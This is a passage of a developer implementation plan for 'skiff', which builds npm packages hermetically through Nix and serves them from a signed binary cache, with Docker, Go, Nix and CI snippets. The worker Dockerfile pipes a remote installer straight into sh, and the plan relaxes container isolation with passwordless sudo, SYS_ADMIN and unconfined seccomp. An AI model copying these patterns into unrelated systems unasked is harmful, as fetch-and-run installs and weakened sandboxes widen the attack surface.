Tests cover each of the six classification outcomes — only pure_js triggers the build child workflow.

- [ ] **4.7 Write `deploy/Dockerfile.worker` (initial — no Nix yet)**

Same shape as `Dockerfile.ingest`, just `cmd/worker`. We add Nix on top in M5.

- [ ] **4.8 Add `worker` service to docker-compose**

```yaml
  worker:
    <<: *platform
    build:
      context: ..
      dockerfile: deploy/Dockerfile.worker
    depends_on:
      temporal:   { condition: service_healthy }
      clickhouse: { condition: service_healthy }
      garage:     { condition: service_healthy }
      garage-bootstrap: { condition: service_completed_successfully }
    networks: [skiff]
    environment:
      TEMPORAL_HOST: "temporal:7233"
      TEMPORAL_NAMESPACE: "default"
      TEMPORAL_TASK_QUEUE: "skiff-default"
      CLICKHOUSE_DSN: "clickhouse://default:@clickhouse:9000/skiff"
      S3_ENDPOINT: "http://garage:3900"
      S3_REGION: "garage"
      S3_BUCKET_SOURCES: "skiff-sources"
      S3_BUCKET_CACHE: "skiff-cache"
      LOG_LEVEL: "info"
      LISTEN_ADDR: ":9090"
      NODEJS_VERSION_TAG: "20"
    env_file: ["./scripts/skiff-keys.env"]
    ports: ["9092:9090"]
```

- [ ] **4.9 End-to-end run**

```bash
docker compose -f deploy/docker-compose.yml up -d --build worker ingest
sleep 60
docker compose exec clickhouse clickhouse-client --query '
  SELECT classification, count(*) FROM skiff.classifications FINAL GROUP BY classification ORDER BY count() DESC'
```
Expected: a mix of classifications, with `pure_js` and `has_lifecycle_script` being the most common.

- [ ] **4.10 Commit Milestone 4**

```bash
git add pkg/workflows cmd/worker cmd/ingest/main.go deploy/
git commit -s -m "feat: temporal workflows driving classification end-to-end"
```

**Acceptance criteria for Milestone 4:**
- `classifications FINAL` has entries with all classes representable within an hour of running (sample size willing).
- Restarting the worker mid-flight does not lose work (Temporal redelivers tasks).
- `package_observed` events appear in `events` for every row in `package_observations`.
- Workflow tests pass.

**Checkpoint:** confirm task queue / concurrency are right. If activity timeouts are firing, tune before M5 adds the much-slower nix build path.

---

## Milestone 5 — Nix packager + `BuildPackage` + cache publish

**Goal:** Real BuildPackage. Worker container has Determinate Nix installed and a persistent `/nix` volume. `pure_js` packages flow through `nix build ./packager.nix` and the resulting store path is signed and uploaded to Garage in Cachix layout.

**Files:**
- Create: `nix/packager.nix`
- Create: `pkg/build/nix.go`, `pkg/build/expr.go`, `pkg/build/nix_test.go`
- Create: `pkg/cache/narinfo.go`, `pkg/cache/narinfo_test.go`, `pkg/cache/nar.go`, `pkg/cache/upload.go`, `pkg/cache/layout.go`
- Create: `scripts/generate-signing-key.sh`
- Modify: `pkg/workflows/build.go` — real implementation
- Modify: `deploy/Dockerfile.worker` — install Determinate Nix
- Modify: `deploy/docker-compose.yml` — privileged worker + `/nix` volume

### Tasks

- [ ] **5.1 Write `nix/packager.nix`**

```nix
# nix/packager.nix
# A function that produces a derivation containing the unpacked contents of
# an npm tarball, with NO lifecycle scripts executed.
#
# Inputs:
#   tarball : a path or store path to the .tgz
#   name    : the npm package name (used in derivation name)
#   version : the npm version (used in derivation name)
#   nodejs  : the nodejs derivation to use (unused at build time in Phase 1,
#             recorded as a build input so the output is parameterised over
#             nodejs version even though the contents don't depend on it)
{ stdenv, lib, gnutar, gzip }:
{ tarball, name, version, nodejs }:
stdenv.mkDerivation {
  pname = "npm-${lib.replaceStrings ["/" "@"] ["-" ""] name}";
  version = version;
  src = tarball;
  dontConfigure = true;
  dontBuild = true;
  unpackPhase = ''
    runHook preUnpack
    mkdir -p $out
    ${gnutar}/bin/tar -xzf $src -C $out --strip-components=1
    runHook postUnpack
  '';
  installPhase = ''
    # No-op. Unpack put files directly into $out.
    runHook preInstall
    runHook postInstall
  '';
  # No npm-install. That's the whole point.
  dontFixup = true;
  meta = {
    description = "Hermetically unpacked npm package ${name}@${version}";
    homepage    = "https://www.npmjs.com/package/${name}/v/${version}";
    platforms   = lib.platforms.linux;
  };
}
```

- [ ] **5.2 Update `nix/flake.nix` to expose `packager`**

```nix
packages.packager = pkgs.callPackage ./packager.nix { };
```

**Important:** because of the curried signature `{ stdenv, lib, gnutar, gzip }: { tarball, name, version, nodejs }:`, `pkgs.callPackage ./packager.nix { }` produces a *function* (the inner lambda), not a derivation. So `nix build .#packager` will fail with "value is a function while a derivation was expected" — this is intentional. The flake output is only for evaluation/import. Actual builds always go through the generated `builder.nix` from `pkg/build/expr.go` (M5.3), which calls the function with concrete arguments and produces a derivation. The eval probe below confirms the function is reachable:
```bash
nix eval --raw .#packager --apply 'f: builtins.toString (f { tarball = ./test.tgz; name = "x"; version = "1.0.0"; nodejs = "20"; }).drvPath'
```

- [ ] **5.3 Write `pkg/build/expr.go`**

Generates a small builder.nix file on demand:
```go
func RenderBuilder(packagerPath, tarballPath, name, version, nodejs string) string
```

Output:
```nix
let
  pkgs = import (fetchTarball {
    url = "https://github.com/NixOS/nixpkgs/archive/<pinned-rev>.tar.gz";
    sha256 = "<pinned-hash>";
  }) {};
  packager = pkgs.callPackage <packagerPath> {};
in
  packager {
    tarball = <tarballPath>;
    name    = "<name>";
    version = "<version>";
    nodejs  = pkgs.nodejs_20;
  }
```

The pinned nixpkgs rev/hash are constants in the Go code, bumped via a separate task when we want to update.

- [ ] **5.4 Write `pkg/build/nix.go`**

```go
type BuildResult struct {
    StorePath        string
    BuildDurationMs  uint32
    LogExcerpt       string
}

type BuildOptions struct {
    PackagerNixPath  string  // /opt/skiff/nix/packager.nix inside the worker container
    TarballPath      string  // /tmp/skiff-build/<id>/source.tgz
    Name, Version    string
    NodeJS           string
    WorkDir          string
}

// Build invokes `nix build --no-link --print-out-paths --json -L --offline
// -f <generated-builder.nix>`. Captures the JSON output, parses the store path,
// captures stderr's last 32KB on failure.
func Build(ctx context.Context, opt BuildOptions) (*BuildResult, error)
```

Notes:
- We do **not** use `--offline` for the first build (nixpkgs needs to be fetched). After the first build the path is cached in /nix.
- `--no-link` keeps the build sandboxed without writing a `result` symlink.
- `--print-out-paths --json` gives a stable machine-readable output.
- All `nix` invocations include `--extra-experimental-features nix-command`.

- [ ] **5.5 Write `pkg/cache/narinfo.go`**

```go
type NarInfo struct {
    StorePath  string
    URL        string         // "nar/<filehash>.nar.xz"
    Compression string        // "xz"
    FileHash   string         // "sha256:<base32>"
    FileSize   uint64
    NarHash    string         // "sha256:<base32>"
    NarSize    uint64
    References []string       // basenames of store paths it references
    Deriver    string         // optional
    Sig        string         // "<keyname>:<base64-sig>"
}

func (n NarInfo) Marshal() string                          // render in narinfo line format
func (n *NarInfo) Sign(keyName string, priv ed25519.PrivateKey, refsAbsolute []string)

// Fingerprint over which the signature is computed.
func Fingerprint(storePath, narHash string, narSize uint64, refsAbsolute []string) string
```

`Sign`:
1. Compute `fp := Fingerprint(...)`.
2. `sig := ed25519.Sign(priv, []byte(fp))`.
3. `n.Sig = keyName + ":" + base64.StdEncoding.EncodeToString(sig)`.

- [ ] **5.6 Write `pkg/cache/narinfo_test.go`**

Vector test: pick a known fingerprint, sign with a known key, assert the produced sig matches the expected base64 string. Test that `Marshal` emits the exact bytes Cachix clients expect — compare against a fixture narinfo from a real cache.

- [ ] **5.7 Write `pkg/cache/nar.go`**

```go
// DumpAndCompressNar shells out to `nix nar dump-path <storePath>` and pipes through `xz -1`.
// Returns (uncompressed sha256 hex, uncompressed size, compressed bytes, compressed sha256 hex, compressed size, error).
func DumpAndCompressNar(ctx context.Context, storePath string) (NarMaterials, error)
```

Streaming sha256 on both sides of the xz pipe. `xz -1` for speed (we can crank up later).

- [ ] **5.8 Write `pkg/cache/upload.go` and `pkg/cache/layout.go`**

`layout.go`:
```go
func NarinfoKey(storePathHash string) string  // "<hash>.narinfo"
func NarKey(fileHashB32 string) string         // "nar/<hash>.nar.xz"
func CacheInfoKey() string                     // "nix-cache-info"
```

`upload.go`:
- Ensures `nix-cache-info` exists in the bucket (idempotent PutObject if not present).
- Uploads nar.xz first, then narinfo. (Order matters: clients that fetch narinfo and follow URL must see the nar present.)
- Content-Type set to `text/x-nix-narinfo` and `application/x-nix-nar` respectively.

- [ ] **5.9 Implement `pkg/workflows/build.go` — real `BuildPackage`**

Workflow steps (each its own activity):
1. `PrepareBuildContextActivity(name, version)` — downloads the source tarball from `skiff-sources` to a local temp dir inside the worker container; returns the local path.
2. `NixBuildActivity(localTarball, name, version, nodejs)` — invokes `pkg/build.Build`; returns `BuildResult` (store path + duration + log excerpt).
3. `CaptureNarActivity(storePath)` — `pkg/cache.DumpAndCompressNar`; returns hashes/sizes/compressed bytes (or a temp file path if too big for activity payload — Phase 1 cap at 200MB).
4. `SignAndUploadActivity(BuildResult, NarMaterials)` — composes narinfo, signs, uploads to Garage; returns `(narinfo_key, nar_key)`.
5. `RecordBuildActivity(success or failure)` and `RecordCachePublicationActivity(...)`.

Each activity has `StartToCloseTimeout` of 10 minutes (nix-build is the long pole), retry max 3.

Idempotency: before NixBuild, check `store.GetLatestBuild` — if a success row exists with matching `(name, version, system, nodejs)`, short-circuit and re-emit the existing cache publication.

- [ ] **5.10 Update `deploy/Dockerfile.worker` — install Determinate Nix**

```dockerfile
# syntax=docker/dockerfile:1.7
FROM golang:1.23-bookworm AS build
WORKDIR /src
COPY go.mod go.sum ./
RUN --mount=type=cache,target=/go/pkg/mod go mod download
COPY . .
RUN --mount=type=cache,target=/go/pkg/mod \
    --mount=type=cache,target=/root/.cache/go-build \
    CGO_ENABLED=0 GOOS=linux go build -trimpath -ldflags="-s -w" \
      -o /out/worker ./cmd/worker

FROM debian:bookworm-slim AS runtime
RUN apt-get update && apt-get install -y --no-install-recommends \
      ca-certificates curl xz-utils sudo \
    && rm -rf /var/lib/apt/lists/*
RUN groupadd -r skiff && useradd -r -g skiff -d /home/skiff -m skiff && \
    echo "skiff ALL=(root) NOPASSWD: /nix/var/nix/profiles/default/bin/nix-daemon" >> /etc/sudoers

# Install Determinate Nix
RUN curl -fsSL https://install.determinate.systems/nix \
      | sh -s -- install linux --init none --no-confirm --extra-conf "experimental-features = nix-command flakes" --extra-conf "sandbox = true"

ENV PATH="/nix/var/nix/profiles/default/bin:${PATH}"

COPY --from=build /out/worker /usr/local/bin/worker
COPY nix/packager.nix /opt/skiff/nix/packager.nix
COPY nix/flake.nix     /opt/skiff/nix/flake.nix

# Entrypoint script starts nix-daemon in the background then execs the worker.
COPY deploy/scripts/worker-entrypoint.sh /usr/local/bin/worker-entrypoint
RUN chmod +x /usr/local/bin/worker-entrypoint
USER skiff
ENTRYPOINT ["/usr/local/bin/worker-entrypoint"]
```

`deploy/scripts/worker-entrypoint.sh`:
```sh
#!/bin/sh
set -e
sudo /nix/var/nix/profiles/default/bin/nix-daemon &
sleep 2
exec /usr/local/bin/worker
```

(If Determinate's `--init none` causes issues, fall back to using `nixos/nix:2.24` as the runtime base — documented in `docs/operations.md`.)

- [ ] **5.11 Update worker compose service for Nix**

```yaml
  worker:
    # ... existing config ...
    volumes:
      - "nix-store:/nix"
    cap_add: ["SYS_ADMIN"]
    security_opt:
      - "seccomp:unconfined"
    # privileged: true  # fallback if cap_add isn't enough; uncomment if sandbox fails
    environment:
      # existing vars +
      CACHE_SIGNING_KEY_FILE: "/run/secrets/cache-signing-key"
      CACHE_PUBLIC_URL: "http://localhost:8081/cache"
    secrets:
      - cache-signing-key

secrets:
  cache-signing-key:
    file: ../secrets/cache-signing-key
```

- [ ] **5.12 Write `scripts/generate-signing-key.sh`**

```sh
#!/usr/bin/env bash
set -euo pipefail
NAME="${1:-skiff-local-1}"
OUT_DIR="${2:-secrets}"
mkdir -p "$OUT_DIR"
go run ./scripts/genkey "$NAME" > "$OUT_DIR/cache-signing-key"
# Also emit the public key for sharing with substituter users.
go run ./scripts/genkey -public "$NAME" "$OUT_DIR/cache-signing-key" > "$OUT_DIR/cache-signing-key.pub"
chmod 600 "$OUT_DIR/cache-signing-key"
echo "wrote $OUT_DIR/cache-signing-key and .pub"
```

`scripts/genkey/main.go` is a tiny Go util that generates the keypair and prints the Nix-format strings. (Could also be `openssl genpkey` but Go is more portable and matches `crypto/ed25519`'s expected secret layout.)

- [ ] **5.13 End-to-end build smoke**

```bash
# Generate signing key (host-side)
./scripts/generate-signing-key.sh skiff-local-1 secrets

# Bring up the full stack with the new worker
docker compose -f deploy/docker-compose.yml up -d --build worker

# Wait for it to chew through a pure_js package
sleep 300
docker compose exec clickhouse clickhouse-client --query '
  SELECT name, version, status, store_path FROM skiff.builds FINAL ORDER BY built_at DESC LIMIT 5'
```

Expected: at least one `status = success` row with a real `/nix/store/...` path.

Verify cache:
```bash
aws --endpoint-url http://localhost:3900 s3 ls s3://skiff-cache/ --recursive | head
```
Expected: `nix-cache-info`, one or more `.narinfo`, one or more `nar/*.nar.xz`.

- [ ] **5.14 Commit Milestone 5**

```bash
git add nix/ pkg/build pkg/cache pkg/workflows/build.go scripts/ deploy/
git commit -s -m "feat: nix packager, hermetic build, signed cache publish to garage"
```

**Acceptance criteria for Milestone 5:**
- At least one pure_js package shows `status = success` in `builds FINAL`.
- `cache_publications FINAL` has a matching row.
- Garage `skiff-cache` bucket contains `nix-cache-info`, the corresponding `.narinfo`, and `nar/<hash>.nar.xz`.
- The narinfo file passes Nix's signature check (verified in M7's smoke test).

**Checkpoint:** review the worker Dockerfile capabilities and `/nix` volume strategy. This is the gnarliest piece operationally; the sandbox-vs-container-privileges tradeoff is worth a paragraph in `docs/operations.md`.

---

## Milestone 6 — `cmd/resolver` HTTP server

**Goal:** A Go HTTP server that translates `(name, version) → cache URL` via ClickHouse and proxies Cachix paths from Garage.

**Files:**
- Create: `cmd/resolver/main.go`
- Create: `deploy/Dockerfile.resolver`
- Modify: `deploy/docker-compose.yml` — add `resolver` service

### Tasks

- [ ] **6.1 Define the resolver API contract**

`GET /resolve/:name/:version` returns:
- 200 OK with JSON body when a successful build + cache_publication exist:
  ```json
  {
    "name": "left-pad",
    "version": "1.3.0",
    "system": "x86_64-linux",
    "nodejs_version": "20",
    "status": "available",
    "cache_url": "http://localhost:8081/cache",
    "store_path": "/nix/store/<hash>-npm-left-pad-1.3.0",
    "narinfo_url": "http://localhost:8081/cache/<hash>.narinfo"
  }
  ```
- 200 OK with status="skipped" + classification reason when a classification exists but no build:
  ```json
  { "name": "...", "version": "...", "status": "skipped", "classification": "has_native_code", "reason": "binding.gyp present at root" }
  ```
- 200 OK with status="pending" when observation exists but no classification yet.
- 404 Not Found when `(name, version)` is unknown.

`GET /cache/*` proxies to Garage. Two implementations possible:
- (a) HTTP reverse proxy to `S3_ENDPOINT/skiff-cache/...` with `Authorization` signed via the SDK presigner.
- (b) Serve Garage directly (Garage has S3-web on :3902) and `/cache/*` redirects.

Phase 1 picks (a) — simpler URL story, single host:port for users. Resolver reads via `s3.GetObject`, streams the response body back to the client with the right `Content-Type` and `Content-Length`.

- [ ] **6.2 Implement `cmd/resolver/main.go`**

Routes via `net/http.ServeMux`:
- `/resolve/{name}/{version}` (Go 1.22+ pattern matching)
- `/cache/{path...}` 
- `/healthz` 
- `/metrics`

Resolution logic uses three Store methods in sequence:
```go
build, ok, _ := store.GetLatestBuild(ctx, name, version, system, nodejs)
if ok && build.Status == "success" {
    pub, _, _ := store.GetLatestCachePublication(ctx, name, version, system, nodejs)
    return responseAvailable(pub, build)
}
cls, ok, _ := store.GetLatestClassification(ctx, name, version)
if ok && cls.Class != classify.ClassPureJS {
    return responseSkipped(cls)
}
obs, ok, _ := store.GetLatestObservation(ctx, name, version)  // new method, add to store
if ok {
    return responsePending(obs)
}
return responseNotFound()
```

(Add `GetLatestObservation` to `pkg/store` here. **Note:** `package_observations` is a plain `MergeTree`, not `ReplacingMergeTree`, so `FINAL` does not apply. The method must select with `ORDER BY observed_at DESC LIMIT 1` to get the most recent row — do not copy the `FINAL` pattern from the other entity getters.)

Cache proxy:
- Parse path after `/cache/`.
- `s3.GetObject(skiff-cache, path)`.
- Stream `Body` to the response, copying `ContentType` and `ContentLength` headers.
- Special-case `nix-cache-info` to be served with `Cache-Control: max-age=86400`.
- Narinfo and nar.xz: `Cache-Control: public, max-age=2592000, immutable`.

Prometheus metrics: `skiff_resolver_requests_total{route,status}`, `skiff_resolver_latency_seconds_bucket{route}`.

- [ ] **6.3 Write `deploy/Dockerfile.resolver`** (mirror of `Dockerfile.ingest`)

- [ ] **6.4 Add `resolver` to docker-compose**

```yaml
  resolver:
    <<: *platform
    build:
      context: ..
      dockerfile: deploy/Dockerfile.resolver
    depends_on:
      clickhouse: { condition: service_healthy }
      garage:     { condition: service_healthy }
    networks: [skiff]
    environment:
      CLICKHOUSE_DSN: "clickhouse://default:@clickhouse:9000/skiff"
      S3_ENDPOINT: "http://garage:3900"
      S3_BUCKET_CACHE: "skiff-cache"
      CACHE_PUBLIC_URL: "http://localhost:8081/cache"
      LISTEN_ADDR: ":8081"
      LOG_LEVEL: "info"
      NODEJS_VERSION_TAG: "20"
      TARGET_SYSTEM: "x86_64-linux"     # override to aarch64-linux on Apple Silicon hosts
    env_file: ["./scripts/skiff-keys.env"]
    ports: ["8081:8081", "9093:9090"]
```

- [ ] **6.5 Test resolver endpoints**

Unit tests for each handler with mocked store + s3. Integration test (with `SKIFF_INTEGRATION=1`) against the live compose stack:

```bash
curl -sf http://localhost:8081/resolve/left-pad/1.3.0 | jq
```

Expected: a `status: "available"` response if left-pad has been built, otherwise `pending` or `skipped`.

- [ ] **6.6 Commit Milestone 6**

```bash
git add cmd/resolver pkg/store deploy/
git commit -s -m "feat: resolver http server with cachix-compatible cache proxy"
```

**Acceptance criteria for Milestone 6:**
- `curl /resolve/<known-pure-js>/<version>` returns `status: "available"` with valid URLs.
- `curl http://localhost:8081/cache/nix-cache-info` returns the static cache-info file.
- `curl http://localhost:8081/cache/<hash>.narinfo` returns a real narinfo with `Sig:` field present.

**Checkpoint:** brief — main risk is request signing & content-type fidelity. Easy to inspect with `curl -i`.

---

## Milestone 7 — Observability + end-to-end smoke test

**Goal:** All three binaries expose Prometheus `/metrics`, structured JSON logs are consistent across binaries, and a `scripts/e2e-smoke.sh` exercises the whole pipeline from a clean stack to "this store path was pulled from skiff's cache by a real `nix copy`."

**Files:**
- Create: `scripts/e2e-smoke.sh`
- Create: `pkg/obs/metrics.go`
- Modify: `cmd/{ingest,worker,resolver}/main.go` — wire metrics + slog correlation

### Tasks

- [ ] **7.1 Standardize logging fields**

Every log line emitted by activities and HTTP handlers includes (when applicable): `name`, `version`, `workflow_id`, `system`, `nodejs_version`, `request_id`. Define a `pkg/obs.LoggerForWorkflow(ctx)` helper that pulls Temporal workflow ID from `workflow.GetInfo(ctx)`.

- [ ] **7.2 Standardize Prometheus metric names**

```
skiff_ingest_changes_rows_total{result}
skiff_ingest_versions_observed_total{result}
skiff_ingest_tarball_bytes_total
skiff_worker_workflows_total{workflow,outcome}
skiff_worker_activities_total{activity,outcome}
skiff_worker_activity_duration_seconds_bucket{activity}
skiff_worker_nix_build_duration_seconds_bucket
skiff_worker_cache_bytes_uploaded_total
skiff_resolver_requests_total{route,status}
skiff_resolver_latency_seconds_bucket{route}
```

All metrics defined in `pkg/obs/metrics.go` with `prometheus.NewCounterVec`/`HistogramVec`. Each binary's `main` calls `obs.RegisterAll()` and exposes them on the `/metrics` handler.

- [ ] **7.3 Write `scripts/e2e-smoke.sh`**

```sh
#!/usr/bin/env bash
set -euo pipefail

# 1. Wipe and bring up clean stack
docker compose -f deploy/docker-compose.yml down -v
./scripts/generate-signing-key.sh skiff-local-1 secrets
docker compose -f deploy/docker-compose.yml up -d --build

# 2. Wait for stack
./deploy/scripts/wait-for-stack.sh

# 3. Submit a known package
docker compose exec ingest sh -c "echo skipped: ingest auto-polls" || true

# 4. Wait for a pure_js build to complete (poll the resolver)
for i in $(seq 1 60); do
  resp=$(curl -fsS http://localhost:8081/resolve/left-pad/1.3.0 || echo '{}')
  status=$(echo "$resp" | jq -r .status)
  echo "[$i] status=$status"
  if [ "$status" = "available" ]; then break; fi
  sleep 10
done
[ "$status" = "available" ] || { echo "no build after 10 minutes"; exit 1; }

# 5. Pull it into a fresh /tmp nix store using the resolver as substituter
STORE=/tmp/skiff-smoke-store
rm -rf "$STORE"
mkdir -p "$STORE"
PUBKEY=$(cat secrets/cache-signing-key.pub)
nix copy \
  --store "local?root=$STORE" \
  --from "http://localhost:8081/cache" \
  --extra-trusted-public-keys "$PUBKEY" \
  $(echo "$resp" | jq -r .store_path)

# 6. Verify the unpacked contents look right
test -f "$STORE$(echo "$resp" | jq -r .store_path)/package.json"
echo "e2e smoke PASS"
```

- [ ] **7.4 Run the smoke**

```bash
bash scripts/e2e-smoke.sh
```
Expected: prints `e2e smoke PASS` within ~15 minutes from a cold start.

- [ ] **7.5 Update `docs/operations.md`** with: metric names, what each means, common failure modes, key rotation procedure, how to read `events` for a stuck workflow.

- [ ] **7.6 Polish `README.md`**

The intro + quickstart already landed in M0.13. Final polish in M7:
- Add a "Status" badge row (CI status, container-image, license, Go version) — the badges will resolve once M8 wires CI and image publishing.
- Add an "Architecture" section linking the architecture diagram (export from `docs/architecture.md` or inline a smaller ASCII version).
- Add a "Metrics" section with the `skiff_*` namespace summary and a sample PromQL.
- Verify every link still resolves; verify the substituter quickstart matches the actual `CACHE_PUBLIC_URL` default.

- [ ] **7.7 Commit Milestone 7**

```bash
git add scripts/e2e-smoke.sh pkg/obs cmd/ docs/ README.md
git commit -s -m "feat: observability metrics, e2e smoke test, operator docs"
```

**Acceptance criteria for Milestone 7:**
- `scripts/e2e-smoke.sh` exits 0 from a fresh `docker compose down -v`.
- All three binaries' `/metrics` returns a populated payload.
- `events` table shows a complete trace for at least one successful pipeline run: `package_observed` → `classified` → `build_started` → `built` → `cache_published`.

**Checkpoint (final):** demo the smoke. The core pipeline is done; OSS release readiness is M8.

---

## Milestone 8 — Open-source release readiness

**Goal:** Skiff is publishable: green CI on every PR, signed container images on ghcr.io, a DCO check enforces sign-off, a tagged release produces published artifacts, and the threat model is reviewed by a second pair of eyes.

**Files:**
- Create: `.github/workflows/ci.yml`, `.github/workflows/dco.yml`, `.github/workflows/images.yml`, `.github/workflows/release.yml`
- Create: `.github/workflows/integration.yml`
- Modify: `README.md` — badges resolve to real URLs
- Modify: `docs/operations.md` — image tags, release procedure
- Create: `docs/release.md` — how to cut a release

### Tasks

- [ ] **8.1 Write `.github/workflows/ci.yml`** — unit tier on every PR

```yaml
name: ci
on:
  pull_request:
  push: { branches: [main] }
jobs:
  lint-and-unit:
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: { go-version: '1.23' }
      - uses: golangci/golangci-lint-action@v6
        with: { version: 'v1.61' }
      - run: go test -race -count=1 ./...
        env: { SKIFF_INTEGRATION: '' }   # unit tier only
```

- [ ] **8.2 Write `.github/workflows/integration.yml`** — full compose stack tier on PRs touching infra

```yaml
name: integration
on:
  pull_request:
    paths: ['pkg/store/**', 'pkg/cache/**', 'pkg/build/**', 'pkg/workflows/**', 'deploy/**', 'nix/**', 'cmd/**']
  workflow_dispatch:
jobs:
  integration:
    runs-on: ubuntu-22.04
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: { go-version: '1.23' }
      - name: Bring up stack
        run: |
          ./scripts/generate-signing-key.sh skiff-ci-1 secrets
          docker compose -f deploy/docker-compose.yml up -d --build
          ./deploy/scripts/wait-for-stack.sh
      - name: Integration tests
        env:
          SKIFF_INTEGRATION: '1'
          CLICKHOUSE_DSN: 'clickhouse://default:@localhost:9000/skiff'
        run: go test -race -count=1 -timeout 20m ./pkg/store ./pkg/cache ./pkg/workflows
      - name: e2e smoke
        run: bash scripts/e2e-smoke.sh
      - name: Capture logs on failure
        if: failure()
        run: docker compose -f deploy/docker-compose.yml logs --no-color > stack.log && cat stack.log
```

- [ ] **8.3 Write `.github/workflows/dco.yml`** — DCO sign-off enforcement

```yaml
name: dco
on:
  pull_request:
    types: [opened, synchronize, reopened]
jobs:
  dco:
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - name: Check DCO
        uses: tim-actions/dco@v1.1.0
```

Document in `CONTRIBUTING.md` how to rebase + re-sign if a contributor forgot `-s`.

- [ ] **8.4 Write `.github/workflows/images.yml`** — build + push container images

```yaml
name: images
on:
  push:
    branches: [main]
    tags: ['v*']
jobs:
  build-push:
    runs-on: ubuntu-22.04
    permissions: { contents: read, packages: write, id-token: write }
    strategy:
      matrix:
        target: [ingest, worker, resolver]
        platform: [linux/amd64, linux/arm64]
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-qemu-action@v3
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - uses: docker/metadata-action@v5
        id: meta
        with:
          images: ghcr.io/skiff-build/skiff-${{ matrix.target }}
          tags: |
            type=ref,event=branch
            type=ref,event=tag
            type=sha,prefix=
            type=semver,pattern={{version}}
      - uses: docker/build-push-action@v6
        with:
          context: .
          file: deploy/Dockerfile.${{ matrix.target }}
          platforms: ${{ matrix.platform }}
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          provenance: true            # SLSA build provenance attached automatically
          sbom: true                  # SPDX SBOM attached
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

(SLSA provenance attached to the image is *not* the same as Phase 1's explicit out-of-scope "no SLSA provenance generation" — that one referred to provenance for *cached package artifacts*. Image provenance is a free win from `docker/build-push-action` and we accept it.)

- [ ] **8.5 Write `.github/workflows/release.yml`** — release tag workflow

```yaml
name: release
on:
  push:
    tags: ['v*']
jobs:
  release:
    runs-on: ubuntu-22.04
    permissions: { contents: write }
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - name: Generate changelog from tag
        run: |
          git log --pretty=format:'- %s (%h)' $(git describe --tags --abbrev=0 HEAD^)..HEAD > NOTES.md
      - uses: softprops/action-gh-release@v2
        with:
          body_path: NOTES.md
          draft: false
          prerelease: ${{ contains(github.ref_name, '-') }}
```

(The image build happens in parallel via `images.yml` since both are triggered by the tag.)

- [ ] **8.6 Write `docs/release.md`**

Procedure:
1. Bump `CHANGELOG.md`.
2. Update version constant in `pkg/config/config.go` (`Version = "0.1.0"`).
3. Commit (signed off), tag `v0.1.0`, push tag.
4. CI builds + pushes images to `ghcr.io/skiff-build/skiff-{ingest,worker,resolver}:0.1.0`.
5. GitHub release populated automatically.
6. Update `docs/public-cache.md` if the public-key set or hosted URL changed.

- [ ] **8.7 Container images pull-through test**

```bash
docker pull ghcr.io/skiff-build/skiff-ingest:main
docker pull ghcr.io/skiff-build/skiff-worker:main
docker pull ghcr.io/skiff-build/skiff-resolver:main
```

Add a docker-compose override `deploy/docker-compose.images.yml` that uses these images instead of building locally — useful for users who want to run skiff without a Go toolchain.

```yaml
services:
  ingest:   { image: ghcr.io/skiff-build/skiff-ingest:main, build: !reset null }
  worker:   { image: ghcr.io/skiff-build/skiff-worker:main, build: !reset null }
  resolver: { image: ghcr.io/skiff-build/skiff-resolver:main, build: !reset null }
```

Document: `docker compose -f deploy/docker-compose.yml -f deploy/docker-compose.images.yml up -d`.

- [ ] **8.8 Threat-model second-pair-of-eyes review**

Dispatch a `superpowers:code-reviewer` subagent (or the human's preferred reviewer) with the specific question: "Read `docs/threat-model.md` and tell me what's missing or misleading from the perspective of a Nix user evaluating whether to trust skiff's cache."

Iterate based on feedback. This is the public-facing artifact most likely to misrepresent the security story.

- [ ] **8.9 Cut `v0.1.0`**

```bash
echo "0.1.0" > VERSION
sed -i 's/Version = ".*"/Version = "0.1.0"/' pkg/config/config.go
# Update CHANGELOG.md
git add VERSION pkg/config/config.go CHANGELOG.md
git commit -s -m "chore: release v0.1.0"
git tag -s v0.1.0 -m "v0.1.0"
git push origin main v0.1.0
```

Watch the `images.yml` and `release.yml` workflows succeed.

- [ ] **8.10 Update README badges**

Now that the workflows + ghcr images exist, replace the placeholder badge URLs with real ones:
```markdown
[![ci](https://github.com/skiff-build/skiff/actions/workflows/ci.yml/badge.svg)](https://github.com/skiff-build/skiff/actions/workflows/ci.yml)
[![image](https://ghcr-badge.egpl.dev/skiff-build/skiff-worker/latest_tag?label=worker)](https://github.com/skiff-build/skiff/pkgs/container/skiff-worker)
[![license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![go report](https://goreportcard.com/badge/github.com/skiff-build/skiff)](https://goreportcard.com/report/github.com/skiff-build/skiff)
```

- [ ] **8.11 Commit Milestone 8**

```bash
git add .github/ docs/release.md deploy/docker-compose.images.yml README.md
git commit -s -m "feat: ci, dco, container image publishing, release workflow"
```

**Acceptance criteria for Milestone 8:**
- A PR to a clean clone shows green checks for ci + dco (and integration when the path filter matches).
- `docker pull ghcr.io/skiff-build/skiff-worker:main` succeeds from a clean machine.
- `git tag -s v0.1.0 && git push --tags` triggers a published release with notes and tagged images.
- `docker compose -f deploy/docker-compose.yml -f deploy/docker-compose.images.yml up -d` brings up the pipeline without a local Go build.
- The threat-model doc has been reviewed by a second pair of eyes.

**Checkpoint:** the project is now open-sourceable. Ship.

---

## Test strategy

| Package | Test type | Notes |
|---|---|---|
| `pkg/classify` | Pure unit, fixture-driven | Zero external deps; fastest tier. Run every commit. |
| `pkg/store` | Integration (live ClickHouse) | Guard with `SKIFF_INTEGRATION=1`. Run on every PR via compose. |
| `pkg/registry` | httptest-based unit | Mock responses; no real network. |
| `pkg/build` | Integration (worker container, real nix) | Slowest tier. Run pre-merge. |
| `pkg/cache` | Mix: narinfo serialization & sig is unit; upload is integration | Use a fixture nar from a real Nix build for sig vectors. |
| `pkg/workflows` | Temporal testsuite (in-process) | All activity calls mocked. Fast. |
